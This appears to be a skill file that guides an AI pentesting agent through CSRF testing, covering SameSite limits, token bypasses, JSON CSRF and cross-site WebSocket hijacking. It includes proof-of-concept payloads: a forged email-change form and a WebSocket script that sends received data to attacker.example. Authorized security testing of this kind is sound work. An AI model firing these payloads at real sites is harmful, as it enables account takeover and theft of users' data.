---
name: csrf-testing
description: Cross-site request forgery testing for state-changing operations
origin: Vigil
vuln_class: csrf
---

# CSRF Testing (Cross-Site Request Forgery)

## Reality Check

SameSite=Lax is now the browser default (Chrome since 2020, Firefox since 2023). This kills classic CSRF for most POST-based state changes. CSRF in 2025 lives in: GET-based state changes, cross-site WebSocket hijacking, SameSite=None services, and the 2-minute Lax+POST window on new cookies. If you are testing a modern app with SameSite=Lax cookies and framework-provided CSRF tokens, classic CSRF is dead. Focus your time on the attack surfaces below where it is not dead.

## When to Activate

- State-changing operations that use cookie-based authentication
- WebSocket endpoints with cookie auth (cross-site WebSocket hijacking)
- OAuth/SSO flows where cross-origin interactions occur
- Legacy applications or APIs that predate SameSite defaults
- Services explicitly setting SameSite=None (cross-domain integrations, embedded iframes, payment processors)

## Tools

- `curl` (manual request replay, cookie and header inspection)
- Burp Suite (generate CSRF PoC, intercept and modify requests)
- Browser DevTools (inspect cookies, SameSite attributes, CORS headers)
- Custom HTML PoC pages (proof of exploitation)

---

## When CSRF Is Dead

These combinations effectively kill CSRF. If all are present, move on:

**Framework auto-protection that actually works:**
- **Rails** — `protect_from_forgery` is on by default since Rails 3. Synchronizer token in every form. CSRF is dead unless the developer added `skip_before_action :verify_authenticity_token` to a controller.
- **Django** — `CsrfViewMiddleware` is enabled by default. Double-submit cookie + hidden field. Dead unless the developer used `@csrf_exempt` on a view.
- **ASP.NET Core** — `[ValidateAntiForgeryToken]` is opt-in per-action but `[AutoValidateAntiforgeryToken]` can be applied globally. Check which one is in use.
- **Spring Security** — CSRF protection is on by default for session-based auth. Dead unless explicitly disabled with `csrf().disable()` (common in API-only backends that use Bearer tokens).

**When the protection is bypassable despite being present:**
- Token exists but server does not validate it (remove the token, request still succeeds)
- Token is not tied to the session (use any valid token from any session)
- Token validation is method-dependent (POST validates, but the endpoint also accepts GET without validation)
- Token is in a cookie but not in the request body (double-submit without HMAC binding — vulnerable if attacker can set cookies via subdomain or CRLF injection)

**Kill signal:** If the application uses Bearer token auth (Authorization header) instead of cookies, CSRF is structurally impossible. Browsers do not automatically attach Authorization headers cross-origin. Stop here.

---

## When CSRF Still Works

### GET-Based State Changes

Still common in legacy apps, admin panels, and internal tools. Any state change triggered by a GET request is trivially CSRFable because SameSite=Lax explicitly allows cookies on top-level GET navigations.

```html
<!-- Image tag fires GET silently -->
<img src="https://target.example/admin/delete-user?id=42">

<!-- Link-based (requires click, but trivial in phishing) -->
<a href="https://target.example/settings/disable-2fa">Click here for your prize</a>
```

**Where to look:** Admin panels, account settings pages, API endpoints that accept GET for mutations (`/api/transfer?amount=1000&to=attacker`), single-click action links in email notifications.

### SameSite=None Services

Any service that explicitly sets `SameSite=None; Secure` on its session cookie has opted out of SameSite protection entirely. Classic CSRF works in full.

**Where to find these:**
- Cross-domain embedded services (payment widgets, chat integrations, SSO providers)
- APIs consumed by third-party sites that need cookie-based auth cross-origin
- Legacy services that set `SameSite=None` to maintain backward compatibility after Chrome's default change

Verify: inspect the `Set-Cookie` header in DevTools or Burp. If `SameSite=None` is present, proceed with classic CSRF PoC.

### The Lax+POST 2-Minute Window

Chrome implements a special exception: when a cookie is created (not just refreshed) with no explicit SameSite attribute, it defaults to Lax BUT allows cross-site POST requests for the first 2 minutes. This exists for SSO compatibility.

**Exploitation scenario:**
1. Attacker page opens `https://target.example/login?redirect=...` in a new tab (top-level navigation)
2. Target creates a new session cookie (no explicit SameSite, defaults to Lax)
3. Within 2 minutes, attacker page submits a cross-site POST form to target
4. Browser sends the cookie because the 2-minute Lax+POST exception is active

**Limitations:** Requires the attacker to trigger a fresh cookie creation. If the victim already has an active session with a cookie older than 2 minutes, this does not apply.

### Subdomain Takeover to Same-Site CSRF

SameSite protects against cross-SITE requests, not cross-ORIGIN. `evil.target.example` and `app.target.example` are same-site. If the attacker controls a subdomain (via dangling DNS, unclaimed cloud resource, or subdomain takeover):

1. Attacker hosts CSRF PoC on `evil.target.example`
2. Requests from `evil.target.example` to `app.target.example` are same-site
3. SameSite=Lax and SameSite=Strict cookies are both sent
4. CSRF tokens may also be bypassable if the token cookie is scoped to `.target.example`

**Chain:** Subdomain takeover finding + CSRF = escalated impact for both findings.

### CORS Misconfiguration Chaining

If the target has a CORS misconfiguration that allows cross-origin reads from attacker domains:

1. Attacker page makes a preflight-approved request to read a page containing the CSRF token
2. Extracts the token from the response
3. Submits the CSRF payload with the valid token

This turns a "CORS reflects arbitrary Origin" finding into full CSRF bypass even with synchronizer tokens. The CORS bug alone allows reads; chained with CSRF it allows writes.

---

## Why Custom Headers Stop CSRF

Many developers add `X-Requested-With: XMLHttpRequest` or `X-CSRF-Token: <value>` without understanding WHY this works. The mechanism:

1. Browsers enforce a rule: cross-origin requests with custom headers trigger a CORS preflight (OPTIONS request)
2. The server's preflight response must explicitly allow the custom header via `Access-Control-Allow-Headers`
3. If the server does not include the appropriate CORS headers, the browser blocks the request entirely
4. An attacker's page on `evil.example` cannot send `X-Requested-With` to `target.example` unless target.example's CORS policy explicitly permits it

**This is the strongest CSRF defense** — it is immune to token theft, does not depend on cookies, and cannot be bypassed by SameSite exceptions. If the application requires a custom header on every state-changing request and does not have a permissive CORS policy, CSRF is dead.

**When it fails:** The server checks for the custom header but ALSO has `Access-Control-Allow-Headers: *` or `Access-Control-Allow-Headers: X-Requested-With` with `Access-Control-Allow-Origin: *` (or reflects the Origin). Now the attacker can send the custom header cross-origin.

---

## JSON CSRF

### Content-Type: text/plain with JSON Body

HTML forms can only send three Content-Types without triggering a preflight: `application/x-www-form-urlencoded`, `multipart/form-data`, and `text/plain`. If the server accepts JSON in the request body but does not enforce the `Content-Type` header:

```html
<form action="https://target.example/api/change-email" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.example","x":"' value='"}' type="hidden">
</form>
<script>document.forms[0].submit()</script>
```

The browser sends `Content-Type: text/plain` with the body `{"email":"attacker@evil.example","x":"="}`. If the server parses the body as JSON regardless of Content-Type, the attack succeeds.

**Gate question:** Does the API return the same response when you change `Content-Type: application/json` to `Content-Type: text/plain` and keep the JSON body? If yes, JSON CSRF via form is possible.

### Fetch API Restrictions

`fetch()` with `Content-Type: application/json` triggers a CORS preflight. This is why modern SPAs that talk to APIs via fetch with JSON Content-Type are inherently protected against CSRF — the custom Content-Type acts like a custom header.

**Kill signal:** If the API rejects requests that do not have `Content-Type: application/json`, the text/plain form trick fails and CSRF is blocked.

### Historical: Flash-Based Content-Type Override

Before Flash's EOL (2020), Flash could send requests with arbitrary Content-Type headers cross-origin without preflight. This made JSON CSRF trivial. No longer relevant for exploitation, but explains why older CSRF guidance emphasized Content-Type enforcement so heavily.

---

## Cross-Site WebSocket Hijacking (CSWSH)

Often more impactful than traditional CSRF because WebSocket connections are persistent and bidirectional. If a WebSocket endpoint uses cookies for authentication and does not validate the Origin header during the upgrade handshake, any site can open a WebSocket to the target and receive all messages.

### Verification

```javascript
// Host this on attacker-controlled domain
var ws = new WebSocket('wss://target.example/ws');

ws.onopen = function() {
  console.log('Connection opened — CSWSH confirmed');
  // Send commands if the protocol allows
  ws.send(JSON.stringify({action: 'get_account_info'}));
};

ws.onmessage = function(e) {
  // Exfiltrate received data
  fetch('https://attacker.example/log', {
    method: 'POST',
    body: e.data
  });
};
```

### What Makes CSWSH Dangerous

1. **Bidirectional** — attacker can both send commands and receive responses. Traditional CSRF is blind (you submit, you do not see the response).
2. **Persistent** — the connection stays open. Attacker receives real-time data for as long as the victim has the page open.
3. **Bypasses CSRF tokens** — WebSocket handshakes do not carry CSRF tokens. The only protection is Origin header validation.
4. **Often overlooked** — developers protect their REST endpoints with CSRF tokens but leave WebSocket endpoints with only cookie auth.

### What to Check

- [ ] Does the WebSocket upgrade request include cookies? (If not, CSWSH is impossible)
- [ ] Does the server validate the Origin header on the upgrade handshake?
- [ ] Is there a ticket/token in the WebSocket URL that is required for connection?
- [ ] What data flows through the WebSocket? (Chat messages, notifications, account data, admin commands)

### Impact Escalation

- **Data exfiltration** — if the WebSocket streams sensitive data (messages, transactions, notifications), the attacker reads it all
- **Action execution** — if the WebSocket accepts commands (send message, transfer funds, change settings), the attacker executes them
- **Account takeover** — if the WebSocket exposes session tokens, API keys, or password reset flows

**Kill signal:** WebSocket uses a per-connection ticket passed as a URL parameter (`wss://target.example/ws?ticket=<random>`) that is not accessible from the cookie jar. Origin check is still the primary defense, but a ticket makes CSWSH significantly harder.

---

## Token Validation Testing

Before building PoCs, determine if the CSRF defense actually works:

- [ ] Remove the CSRF token entirely — does the request succeed?
- [ ] Submit an empty token value
- [ ] Use a token from a different user's session
- [ ] Reuse an expired or old token (from hours/days ago)
- [ ] Change the token to an arbitrary string of the same length
- [ ] Check if the token is tied to the session or is a static value
- [ ] Swap HTTP method: POST to GET (may bypass token check for GET requests)
- [ ] For double-submit cookies: can you set the cookie via subdomain or CRLF injection to match an arbitrary token value?

## Referer/Origin Header Bypass

Some applications validate Referer or Origin instead of (or in addition to) tokens:

- [ ] Remove the Referer header: `<meta name="referrer" content="no-referrer">` then submit the form
- [ ] Set Origin to `null` (sandboxed iframe: `<iframe sandbox="allow-scripts allow-forms" src="data:text/html,...">`)
- [ ] Subdomain match bypass: if validation checks `endsWith('target.example')`, use `attackertarget.example`
- [ ] Path prefix: if validation checks `startsWith('https://target.example')`, use `https://target.example.evil.example`
- [ ] Regex errors: missing anchors, dot not escaped (`target.example` matches `targetXcom`)

---

## High-Value CSRF Targets

Ordered by impact. If you find CSRF on any of these, it is worth reporting even if other endpoints are protected:

1. **Password change** (without requiring current password) — account takeover
2. **Email change** — password reset to attacker email = account takeover
3. **API key generation/rotation** — persistent access even after password change
4. **Admin actions** — create user, change roles, modify permissions
5. **Financial transactions** — transfers, purchases, subscription changes
6. **2FA disable** — downgrades account security for future attacks
7. **Login CSRF** — force victim into attacker's account to capture victim's data

## Chained Attacks

| Chain | Result |
|---|---|
| CSRF + Self-XSS | Stored XSS via CSRF (attacker forces victim to submit XSS payload to their own profile) |
| CSRF + Login | Login CSRF — force victim into attacker's session to capture their subsequent activity |
| CSRF + CORS misconfig | Extract CSRF token cross-origin, then use it to submit forged request |
| CSRF + OAuth | Force victim to link attacker's OAuth account, or steal victim's OAuth token |
| Subdomain takeover + CSRF | Same-site attack bypasses SameSite cookies entirely |
| CSWSH + data exfil | Persistent bidirectional access to victim's WebSocket stream |

---

## What to Record

- Endpoint and HTTP method vulnerable to CSRF
- Which protection was missing or bypassable (no token, no SameSite, broken validation)
- Working PoC HTML that demonstrates the forged action
- Business impact of the specific action being forged
- Severity: Medium (settings change) to High (account takeover) to Critical (admin action + no interaction beyond visiting attacker page)
- If CSWSH: what data is accessible and what commands can be sent through the hijacked connection

## Kill Signals — Stop Testing When
- SameSite=Strict on all session cookies → CSRF not possible via any vector, skip entirely
- SameSite=Lax AND no GET-based state changes AND no WebSocket endpoints → CSRF effectively dead, move on
- Custom header required on all state-changing requests (X-CSRF-Token in header, not cookie) → CSRF blocked by browser preflight, move on
- Valid CSRF token required AND token properly validated AND not predictable → protection is effective, move on
- CSRF PoC succeeds on state-changing endpoint → record finding, assess impact, stop testing other endpoints unless higher-value target exists

## Escalate When
- Removing the CSRF token, blanking it, or sending any non-empty string produces a success response — the server is checking presence or parsing leniency, not signature, push through token-tampering variants before declaring the protection valid
- SameSite is Lax (default) and any state-changing verb is reachable via GET, or via a top-level navigation (window.open, form submit with method=GET/POST) — Lax does not protect top-level POSTs initiated by form submission from the attacker page
- The endpoint accepts Content-Type `text/plain`, `application/x-www-form-urlencoded`, or `multipart/form-data` for a JSON body — simple-request CORS bypass lets a cross-origin form POST arbitrary JSON-shaped bodies without preflight
- A token issued to user A is accepted on a request authenticated as user B, or a token from any session validates — the token is not bound to the session and CSRF is live
- A WebSocket handshake succeeds without an Origin check or custom header — CSWSH lets the attacker page send arbitrary frames over the victim's authenticated socket, enumerate the command surface

## Extended Resources

- `agent/references/payloads/csrf-payloads.md` — auto-submit forms, JSON CSRF, token bypass techniques
